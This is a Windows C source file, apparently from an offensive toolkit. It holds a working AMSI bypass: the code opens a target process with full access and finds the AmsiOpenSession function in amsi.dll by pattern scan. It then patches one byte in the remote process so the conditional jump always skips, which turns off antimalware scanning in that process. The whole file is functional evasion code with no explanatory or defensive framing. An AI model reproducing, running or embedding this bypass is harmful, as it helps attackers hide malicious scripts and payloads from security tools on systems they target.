#include "Win32Helper.h"

typedef HRESULT(WINAPI* AMSIOPENSESSION)(HAMSICONTEXT, HAMSISESSION*);

BYTE AmsiPattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74 };
UCHAR AmsiPatch[] = { 0xeb };

ULONGLONG UnusedSubroutineSearchAmsiPattern(PBYTE Address, DWORD Size, PBYTE Pattern, DWORD PatternSize)
{
	for (DWORD dwX = 0; dwX < 1024; dwX++)
	{
		if (Address[dwX] == Pattern[0])
		{
			DWORD dwOffset = 1;
			while (dwOffset < PatternSize && dwX + dwOffset < Size && (Pattern[dwOffset] == '?' || Address[dwX + dwOffset] == Pattern[dwOffset]))
			{
				dwOffset++;
			}

			if (dwOffset == PatternSize)
				return (ULONGLONG)(dwX + 3);
		}
	}

	return 0;
}

BOOL AmsiBypassViaPatternScan(_In_ DWORD ProcessId)
{
	HANDLE hProcess = NULL;
	HMODULE hMod = NULL;
	BOOL bFlag = FALSE;
	AMSIOPENSESSION pfnAmsiOpenSession = NULL;
	BYTE AmsiBuffer[1024] = { 0 };
	ULONGLONG AmsiAddress = 0LL, PatchedAmsiAddress = 0LL;
		
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
	if (hProcess == NULL)
		goto EXIT_ROUTINE;

	hMod = LoadLibraryW(L"amsi.dll");
	if (hMod == NULL)
		goto EXIT_ROUTINE;

	pfnAmsiOpenSession = (AMSIOPENSESSION)GetProcAddressA((DWORD64)hMod, "AmsiOpenSession");
	if (!pfnAmsiOpenSession)
		goto EXIT_ROUTINE;

	if (!ReadProcessMemory(hProcess, pfnAmsiOpenSession, &AmsiBuffer, 1024, NULL))
		goto EXIT_ROUTINE;

	AmsiAddress = UnusedSubroutineSearchAmsiPattern(AmsiBuffer, sizeof(AmsiBuffer), AmsiPattern, sizeof(AmsiPattern));
	if (AmsiAddress == 0)
		goto EXIT_ROUTINE;

	PatchedAmsiAddress = (ULONGLONG)pfnAmsiOpenSession;
	PatchedAmsiAddress += AmsiAddress;

	if (!WriteProcessMemory(hProcess, (LPVOID)PatchedAmsiAddress, AmsiPatch, 1, NULL))
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hProcess)
		CloseHandle(hProcess);

	return bFlag;
}
